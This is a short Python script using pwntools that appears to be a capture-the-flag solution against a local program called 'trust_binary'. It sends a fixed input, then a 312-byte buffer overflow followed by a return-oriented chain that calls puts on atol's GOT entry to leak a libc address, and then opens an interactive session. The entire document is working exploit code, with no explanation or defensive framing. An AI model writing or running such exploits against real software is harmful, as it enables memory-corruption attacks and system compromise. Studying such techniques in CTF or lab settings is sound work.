from pwn import *

p = process('./trust_binary')
e = ELF('./trust_binary')

context.log_level="debug"

pause()

p.recv()

p.sendline('5570')

p.recv()
payload = 'a' * 312

payload +=  p64(0x4008f3)
payload += p64(e.got['atol'])
payload += p64(e.plt['puts'])


p.sendline(payload)

p.interactive()
